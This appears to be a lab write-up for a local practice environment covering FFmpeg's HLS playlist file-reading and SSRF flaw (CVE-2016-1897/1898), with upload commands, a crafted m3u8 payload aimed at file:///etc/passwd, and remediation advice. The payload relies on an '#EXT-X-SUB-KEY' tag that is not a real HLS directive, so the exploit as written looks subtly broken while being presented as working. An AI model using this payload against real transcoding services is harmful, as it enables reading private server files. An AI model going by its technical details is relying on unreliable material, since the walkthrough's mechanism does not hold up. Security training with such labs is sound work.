# FFmpeg HLS Playlist File Reading & SSRF (CVE-2016-1897 / CVE-2016-1898)

## Overview

FFmpeg is the leading multimedia framework used by video transcoding services and social platforms. In FFmpeg versions prior to 2.8.5 and 3.0, the HLS (HTTP Live Streaming) playlist parser allowed external URL redirection and subfile protocol handling without restrictions. An attacker can upload a crafted .avi or .m3u8 file referencing local files (e.g. file:///etc/passwd), causing the transcode output or HTTP callbacks to leak local files.

- **Service Access**: `http://localhost:8165/`
- **Default Credentials**: `Unauthenticated media upload`
- **Docker Shortcut**: `./lab start ffmpeg-hls-ssrf`
- **Container Name**: `cyberlab_02_ffmpeg_hls_ssrf`
- **RAM Footprint**: ~80M

---

## Exploitation Walkthrough

### 1. Inspect Video Upload Web Interface

```bash
curl -i http://localhost:8165/
```

### 2. Generate Malicious HLS Playlist

```bash
cat << 'EOF' > /tmp/evil.m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
http://example.com/live.m3u8
#EXT-X-SUB-KEY:URI="file:///etc/passwd"
EOF
```

### 3. Upload Crafted Video and Observe Exfiltrated Content

```bash
curl -F 'file=@/tmp/evil.m3u8' http://localhost:8165/upload.php
```

---

## Defensive Remediation & Hardening

1. Upgrade FFmpeg to version 2.8.5, 3.0 or higher.
2. Whitelist permitted input protocols using -protocol_whitelist 'file,http,https,tcp,tls'.
3. Transcode media files inside non-privileged, isolated sandbox containers.

---

## Video Walkthroughs & Technical References

- [Server-Side Request Forgery (SSRF) | Complete Guide](https://www.youtube.com/watch?v=ih5R_c16bKc)
- [FFmpeg CVE-2016-1897 / CVE-2016-1898 Report](https://trac.ffmpeg.org/ticket/5132)
- [Vulhub FFmpeg Environment](https://vulhub.org/#/environments/ffmpeg/CVE-2016-1897/)
